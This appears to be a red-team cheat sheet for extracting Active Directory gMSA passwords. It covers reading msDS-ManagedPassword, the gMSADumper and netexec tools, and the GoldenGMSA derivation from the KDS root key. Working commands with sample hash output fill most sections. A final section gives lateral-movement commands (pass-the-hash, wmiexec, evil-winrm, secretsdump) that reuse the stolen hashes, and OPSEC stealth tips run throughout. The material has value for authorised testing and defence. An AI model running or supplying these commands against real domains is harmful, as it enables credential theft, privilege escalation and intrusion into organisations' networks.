---
aliases:
  - gMSADumper
  - GoldenGMSA
  - msDS-ManagedPassword
  - gMSA Hash Dump
tags:
  - type/cheatsheet
  - vuln/ad-enumeration
  - technique/credential-access
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[AD - gMSA Enumeration]]"
---
# AD - gMSA Enumeration - gMSA Password Dump

***

## msDS-ManagedPassword Blob

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| `msDS-ManagedPassword` | Binary blob | Encrypted. |
| MSDS-MANAGEDPASSWORD_BLOB structure | Microsoft format | Standard. |
| Contains current + previous password | Rotation grace period | Standard. |
| Read access controlled | msDS-GroupMSAMembership | Standard. |
| Authenticated Users default: blocked | Confidential flag | Standard. |
| Decrypt via Microsoft API | Native | Standard. |
| `Get-ADServiceAccount -Properties msDS-ManagedPassword` | Direct read (if authorized) | Standard. |
| Returns decrypted blob | Auto | Standard. |
| Atacante extracts NT hash | From decrypted password | Standard. |
| AES keys also derivable | Standard | Standard. |
| Cleartext password in blob | If unicode encoding | Standard. |
| Per-rotation interval | Default 30 days | Standard. |
| Stale blob | Old password still in blob | Edge. |
| Detection: msDS-ManagedPassword read events | Defender | Adjacent. |
| Read event = critical alert | Defender | Adjacent. |
| Bulk read = mass compromise indicator | Defender ML | Modern. |
^ad-gmsadump-blob

### msDS-ManagedPassword read

```powershell
# Native PowerShell (auto-decrypts if authorized)
$gmsa = Get-ADServiceAccount -Identity gMSA-svc01 -Properties msDS-ManagedPassword

# msDS-ManagedPassword is decoded automatically
$pwd = $gmsa.'msDS-ManagedPassword'
$pwd  # binary blob

# Microsoft helper to decrypt
[System.Text.Encoding]::Unicode.GetString($pwd.CurrentPassword)
```

___

## gMSADumper (Python Tool)

| **Comando** | **Output** | **Notas** |
|:---:|:---:|:---:|
| `git clone https://github.com/micahvandeusen/gMSADumper` | Install | Standard. |
| `python3 gMSADumper.py -u user -p pass -d dom.local` | Authenticated dump | Standard. |
| Output: gMSA name + NT hash + AES keys + Kerberos keys | Direct cred | Standard. |
| Per-gMSA result | Standard | Standard. |
| Failed reads = ACL denied | Per-gMSA | Standard. |
| Bulk all gMSAs | Standard | Standard. |
| Linux-friendly | Cross-platform | Standard. |
| Custom DC `-l DC` | Specific DC | Adjacent. |
| Kerberos auth `-k` | TGT-based | Edge. |
| NTLM hash auth `-H :NT_HASH` | Pass-the-Hash | Adjacent. |
| Output format | JSON-friendly | Standard. |
| Modern Python lib usage (impacket) | Standard | Standard. |
| Detection: bulk gMSA reads | Defender | Adjacent. |
| OPSEC: per-gMSA targeted | Stealthier | Standard. |
| Cleanup not needed (read-only) | Standard | OPSEC. |
| Combine with priv group enum | Strategy | Standard. |
^ad-gmsadump-tool

### gMSADumper usage

```bash
# Install
git clone https://github.com/micahvandeusen/gMSADumper
cd gMSADumper
pip install -r requirements.txt

# Authenticated dump
python3 gMSADumper.py -u user -p pass -d dom.local

# Output:
# Users or groups who can read password for gMSA-svc01:
#  > dom.local\IT-Servers
# gMSA-svc01:::aad3b435b51404eeaad3b435b51404ee:abc123def456...
# gMSA-svc01:aes256-cts-hmac-sha1-96:abc123def456...
# gMSA-svc01:aes128-cts-hmac-sha1-96:abc123def456...

# With Kerberos auth
KRB5CCNAME=/tmp/user.ccache python3 gMSADumper.py -u user -k -d dom.local

# With NTLM hash
python3 gMSADumper.py -u user -H aad3b435b51404eeaad3b435b51404ee:hash -d dom.local
```

___

## netexec --gmsa

| **Comando** | **Output** | **Notas** |
|:---:|:---:|:---:|
| `nxc ldap DC -u u -p p --gmsa` | Bulk gMSA read | Standard. |
| Output: gMSA + NT hash + readers | Direct cred | Standard. |
| Per-gMSA result | Standard | Standard. |
| Anonymous: blocked | Standard | Standard. |
| Authenticated baseline | Standard | Standard. |
| `crackmapexec ldap DC -u u -p p --gmsa` | Older name | Same. |
| Bulk subnet | Edge | Edge. |
| Combined with --kerberoasting | Adjacent | Adjacent. |
| Combined with --laps | Comprehensive | Adjacent. |
| Output to file | Standard | Reportable. |
| Verbose `-v` | Debug | Standard. |
| `--continue-on-success` | Per-host | Standard. |
| Auto-decrypt blob | Standard | Standard. |
| Cross-domain via different DCs | Per-domain | Adjacent. |
| Modern netexec preferred | Standard | Standard. |
| Detection: bulk gMSA reads | Defender | Adjacent. |
^ad-gmsadump-netexec

### netexec gMSA dump

```bash
# Authenticated bulk gMSA dump
nxc ldap DC -u user -p pass --gmsa

# Output:
# LDAP   DC  389  DC  Account: gMSA-svc01$  NTLM: aad3b435...:abc123def456...
# LDAP   DC  389  DC  PrincipalsAllowedToReadPassword: dom\IT-Servers

# Combine with kerberoast (gMSAs often SPN-bound)
nxc ldap DC -u user -p pass --gmsa --kerberoasting kerb.txt

# Authenticated with NT hash
nxc ldap DC -u user -H aad3b435...:hash --gmsa
```

___

## GoldenGMSA Technique

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| GoldenGMSA = derive password from KDS Root Key | Modern attack | Critical. |
| Required: KDS Root Key + msDS-ManagedPasswordId | Crypto inputs | Standard. |
| KDS key: forest-wide (CN=Master Root Keys) | Standard | Standard. |
| Derive password without ACL on gMSA | Bypass msDS-GroupMSAMembership | Critical. |
| Atacante with DCSync rights → KDS key | Adjacent | Adjacent. |
| Tool: GoldenGMSA (Semperis) | Open source | Standard. |
| `GoldenGMSA list` | Enum gMSAs + KDS key | Standard. |
| `GoldenGMSA compute --kdskey ... --gmsa ...` | Derive password | Standard. |
| Useful when ACL blocks direct read | OPSEC | Standard. |
| Per-domain KDS key | Forest-wide | Standard. |
| Cross-trust GoldenGMSA | If KDS key access | Edge. |
| Detection: KDS key access events | Defender | Adjacent. |
| Detection: bulk gMSA derivation | ML | Modern. |
| Modern Microsoft mitigation | KDS rotation | Best practice. |
| Audit: KDS key access | Standard | Compliance. |
| Modern: limit KDS key access | Hardening | Standard. |
^ad-gmsadump-goldengmsa

### GoldenGMSA usage

```bash
# Install
git clone https://github.com/Semperis/GoldenGMSA
# Or build from source

# Step 1: List KDS keys + gMSAs
GoldenGMSA list

# Output:
# KDS Root Key: Guid abc123-... EffectiveTime: 2020-01-01
# gMSA: svc01$  msDS-ManagedPasswordId: blob

# Step 2: Compute password offline
GoldenGMSA compute --kdskey blob.bin --gmsa svc01$ --pwdid pwdid.bin

# Output: NT hash + AES keys (without needing read ACL)
```

```powershell
# PowerShell native (Win Server 2022+)
Add-KdsRootKey -EffectiveImmediately
# DA only — atacante with DA can re-create KDS key + new gMSA passwords
```

___

## Native PowerShell Read

| **Comando** | **Output** | **Notas** |
|:---:|:---:|:---:|
| `Install-ADServiceAccount gMSA-svc01` | Per-host install | Privileged. |
| `Test-ADServiceAccount gMSA-svc01` | Verify password readable | True/False. |
| Run on host listed in `HostComputers` | Required | Standard. |
| As local SYSTEM context | Standard | Standard. |
| As compromised computer admin | Edge — needs SYSTEM | Edge. |
| `Get-ADServiceAccount -Properties msDS-ManagedPassword` | Direct read | Standard. |
| Returns decrypted blob auto | Standard | Standard. |
| Auto-decrypt via Microsoft API | Standard | Standard. |
| Linux: cannot natively decrypt | Edge | Edge. |
| Use gMSADumper for Linux | Standard | Standard. |
| Cross-correlate authorized principal | Standard | Standard. |
| OPSEC: per-host vs per-DC | Trade-off | OPSEC. |
| Detection: gMSA install events | Defender | Adjacent. |
| Audit: gMSA installation log | Standard | Adjacent. |
| Modern: native preferred | Standard | Standard. |
| Detection: msDS-ManagedPassword read | Defender | Adjacent. |
^ad-gmsadump-pwsh

### PowerShell native read

```powershell
# As authorized computer / user
Import-Module ActiveDirectory

# Test if can read
Test-ADServiceAccount gMSA-svc01

# Direct read (if authorized)
$gmsa = Get-ADServiceAccount -Identity gMSA-svc01 -Properties msDS-ManagedPassword
$blob = $gmsa.'msDS-ManagedPassword'

# Decode current password (Unicode)
$currentPwd = [System.Text.Encoding]::Unicode.GetString($blob.CurrentPassword)

# Or with custom decoder script
# Microsoft DSInternals module
Install-Module DSInternals
Import-Module DSInternals
ConvertFrom-ADManagedPasswordBlob $blob
```

___

## NT Hash Extraction from gMSA

| **Step** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| 1. Read msDS-ManagedPassword blob | Direct | Standard. |
| 2. Decode binary structure | MSDS-MANAGEDPASSWORD_BLOB | Standard. |
| 3. Extract CurrentPassword (Unicode) | Cleartext | Standard. |
| 4. Compute NT hash | MD4(unicode(password)) | Standard. |
| 5. Output: NT hash for PtH | Direct | Standard. |
| AES keys also derivable | RFC 4757 + RFC 8009 | Standard. |
| `Get-ADServiceAccount` auto-decodes | Standard | Standard. |
| `gMSADumper.py` outputs NT hash | Standard | Standard. |
| `nxc --gmsa` outputs NT hash | Standard | Standard. |
| DSInternals `ConvertFrom-ADManagedPasswordBlob` | PowerShell | Standard. |
| Atacante: NT hash → PtH lateral | Direct | Standard. |
| Atacante: AES key → PtT (S4U2Self) | Adjacent | Adjacent. |
| Cleartext password (rare) | If app needs it | Standard. |
| Modern: AES preferred | Hardening | Standard. |
| Detection: PtH events post-gMSA dump | Defender | Adjacent. |
| OPSEC: hash use vs cleartext | Trade-off | OPSEC. |
^ad-gmsadump-nthash

### NT hash extraction

```powershell
# DSInternals module (best for full extraction)
Install-Module DSInternals
Import-Module DSInternals

$gmsa = Get-ADServiceAccount -Identity gMSA-svc01 -Properties msDS-ManagedPassword
$blob = $gmsa.'msDS-ManagedPassword'

ConvertFrom-ADManagedPasswordBlob $blob

# Output:
# Version : 1
# CurrentPassword : System.Byte[]
# Properties:
#   ClearPassword : <unicode bytes>
#   NTHash : abc123def456...
#   Aes128Key : ...
#   Aes256Key : ...
#   PreviousNTHash : ...

# Use NT hash with PtH:
# nxc smb host -u 'gMSA-svc01$' -H aad3b435...:abc123def456...
```

```bash
# Linux pipeline
python3 gMSADumper.py -u user -p pass -d dom.local | grep -E ':::[a-f0-9]+:[a-f0-9]+:::$'

# Output format:
# gMSA-svc01:::aad3b435b51404eeaad3b435b51404ee:NTHASH:::

# Use with Impacket
impacket-secretsdump dom/'gMSA-svc01$'@DC -hashes :NTHASH
```

___

## Pivot Post-gMSA Dump

| **Action** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| Pass-the-Hash with NT hash | `nxc smb host -u 'gMSA$' -H :NTHASH` | Standard. |
| Pass-the-Ticket | `Rubeus asktgt /user:gMSA$ /aes256:...` | Adjacent. |
| Kerberoast cross-trust if SPN | Standard | Adjacent. |
| Service impersonation | If gMSA in delegation | Adjacent. |
| LSASS dump on gMSA host | Adjacent | Adjacent. |
| WMI / WinRM as gMSA | Standard | Standard. |
| Modify scheduled task as gMSA | Adjacent | Edge. |
| gMSA in DA → DCSync | Direct | Critical. |
| gMSA in Backup Operators → NTDS dump | Standard | Critical. |
| gMSA in Server Operators → DC privesc | Standard | Critical. |
| Cross-correlate gMSA priv | Strategy | Standard. |
| Cleanup: invalidate via password rotation | Defender | Adjacent. |
| Persistence: stored gMSA hash valid until rotation | Default 30 days | Standard. |
| Detection: gMSA usage events | Defender | Adjacent. |
| OPSEC: time-of-use match legit | Stealth | OPSEC. |
| Audit: post-compromise gMSA use | Defender | Adjacent. |
^ad-gmsadump-pivot

### Pivot examples

```bash
# Pass-the-Hash with gMSA NT hash
nxc smb 10.0.0.50 -u 'gMSA-svc01$' -H ':NTHASH'

# WMI exec as gMSA
impacket-wmiexec -hashes :NTHASH 'dom/gMSA-svc01$'@10.0.0.50

# WinRM as gMSA
evil-winrm -i 10.0.0.50 -u 'gMSA-svc01$' -H NTHASH

# Cross-trust Kerberoast if gMSA has SPNs
impacket-GetUserSPNs -hashes :NTHASH 'dom/gMSA-svc01$'@DC
```

***
